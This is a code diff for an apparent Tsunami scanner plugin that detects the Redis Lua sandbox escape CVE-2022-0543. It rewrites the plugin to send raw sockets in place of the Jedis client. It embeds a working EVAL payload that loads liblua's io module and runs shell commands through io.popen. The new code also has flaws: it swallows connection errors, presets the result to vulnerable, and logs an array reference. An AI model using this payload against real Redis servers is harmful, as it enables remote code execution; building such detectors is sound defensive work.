@@ -21,7 +21,9 @@ import static com.google.common.collect.ImmutableList.toImmutableList;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.net.HostAndPort;
 import com.google.protobuf.util.Timestamps;
+import com.google.tsunami.common.data.NetworkEndpointUtils;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
@@ -37,13 +39,16 @@ import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
+import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
 import java.io.IOException;
+import java.net.InetSocketAddress;
+import java.net.Socket;
+import java.nio.charset.StandardCharsets;
 import java.time.Clock;
 import java.time.Instant;
 import javax.inject.Inject;
-import redis.clients.jedis.Jedis;
-import redis.clients.jedis.JedisPool;
-import redis.clients.jedis.exceptions.JedisException;
+import javax.net.SocketFactory;
 
 /** A VulnDetector plugin for Redis CVE-2022-0543. */
 @PluginInfo(
@@ -54,9 +59,13 @@ import redis.clients.jedis.exceptions.JedisException;
     author = "shpei1963 (shpei1963@outlook.com)",
     bootstrapModule = Cve20220543DetectorBootstrapModule.class)
 public final class Cve20220543Detector implements VulnDetector {
+
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
+
   private static final String EXPLOIT_SCRIPT =
-      "local io_l = package.loadlib(\"%s\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"%s\", \"r\"); local res = f:read(\"*a\"); f:close(); return res";
+      "eval \"local io_l = package.loadlib(\\\"%s\\\", \\\"luaopen_io\\\"); local io = io_l();"
+          + " local f = io.popen(\\\"%s\\\", \\\"r\\\"); local res = f:read(\\\"*a\\\"); f:close();"
+          + " return res\" 0\n";
   private static final ImmutableList<String> LIB_LUA_PATHES =
       ImmutableList.of("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0");
 
@@ -65,23 +74,26 @@ public final class Cve20220543Detector implements VulnDetector {
 
   @VisibleForTesting
   static final String DESCRIPTION =
-      "Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache, and message broker. Due to a packaging issue, Redis is prone to a (Debian-specific) Lua sandbox escape, which could result in remote code execution.";
+      "Redis is an open source (BSD licensed), in-memory data structure store, used as a database,"
+          + " cache, and message broker. Due to a packaging issue, Redis is prone to a"
+          + " (Debian-specific) Lua sandbox escape, which could result in remote code execution.";
 
   @VisibleForTesting
   static final String RECOMMENDATION =
-      "Upgrade Redis to a fixed version based on https://security-tracker.debian.org/tracker/CVE-2022-0543";
+      "Upgrade Redis to a fixed version based on"
+          + " https://security-tracker.debian.org/tracker/CVE-2022-0543";
 
   private final Clock utcClock;
-  private final JedisPoolFactory jedisPoolFactory;
+  private final SocketFactory socketFactory;
   private final PayloadGenerator payloadGenerator;
+  final int CONNECT_TIMEOUT = 5000;
+  final int READ_TIMEOUT = 2000;
 
   @Inject
   Cve20220543Detector(
-      @UtcClock Clock utcClock,
-      JedisPoolFactory jedisPoolFactory,
-      PayloadGenerator payloadGenerator) {
+      @UtcClock Clock utcClock, SocketFactory socketFactory, PayloadGenerator payloadGenerator) {
     this.utcClock = checkNotNull(utcClock);
-    this.jedisPoolFactory = jedisPoolFactory;
+    this.socketFactory = checkNotNull(socketFactory);
     this.payloadGenerator = checkNotNull(payloadGenerator);
   }
 
@@ -105,38 +117,70 @@ public final class Cve20220543Detector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
-    try (JedisPool jedisPool = jedisPoolFactory.create(networkService.getNetworkEndpoint());
-        Jedis jedis = jedisPool.getResource()) {
+    Socket socket = null;
+    BufferedOutputStream out = null;
+    BufferedInputStream in = null;
+
+    /** Create socket and connect */
+    HostAndPort target = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
+    try {
+      socket = socketFactory.createSocket();
+      socket.connect(new InetSocketAddress(target.getHost(), target.getPort()), CONNECT_TIMEOUT);
+      socket.setSoTimeout(READ_TIMEOUT);
+
+      out = new BufferedOutputStream(socket.getOutputStream());
+      in = new BufferedInputStream(socket.getInputStream());
+    } catch (IOException e) {
+    }
+
+    boolean isVulnerable = true;
+    /** Detect */
+    try {
       for (String luaPath : LIB_LUA_PATHES) {
-        if (isServiceVulnerableToLuaPath(jedis, luaPath)) {
-          return true;
+        PayloadGeneratorConfig config =
+            PayloadGeneratorConfig.newBuilder()
+                .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
+                .setInterpretationEnvironment(
+                    PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+                .setExecutionEnvironment(
+                    PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+                .build();
+
+        // curl is not installed on the tested docker composes, as this is a REFLECTIVE_RCE fallback
+        // to the printf payload by default
+        Payload payload = this.payloadGenerator.generateNoCallback(config);
+        String script = String.format(EXPLOIT_SCRIPT, luaPath, payload.getPayload());
+
+        out.write(script.getBytes());
+        out.flush();
+
+        // we assume that the response from callback server is less than 2048
+        byte[] buffer = new byte[2048];
+
+        int b = in.read(buffer, 0, buffer.length);
+        if (b < 1) {
+          throw new IOException("Unexpected end of stream");
+        }
+
+        logger.atInfo().log(buffer.toString());
+        isVulnerable = payload.checkIfExecuted(new String(buffer, StandardCharsets.UTF_8));
+        if (isVulnerable) {
+          break;
         }
       }
-      return false;
+
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Cannot execute exploit.");
       return false;
     }
-  }
 
-  private boolean isServiceVulnerableToLuaPath(Jedis jedis, String luaPath) {
     try {
-      PayloadGeneratorConfig config =
-          PayloadGeneratorConfig.newBuilder()
-              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
-              .setInterpretationEnvironment(
-                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
-              .setExecutionEnvironment(
-                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
-              .build();
-
-      Payload payload = this.payloadGenerator.generate(config);
-      String script = String.format(EXPLOIT_SCRIPT, luaPath, payload.getPayload());
-      return payload.checkIfExecuted((String) jedis.eval(script));
-    } catch (JedisException e) {
-      logger.atInfo().withCause(e).log("Jedis error, target is not vulnerable");
-      return false;
+      /** Clean up */
+      socket.close();
+    } catch (IOException e) {
     }
+
+    return isVulnerable;
   }
 
   private DetectionReport buildDetectionReport(
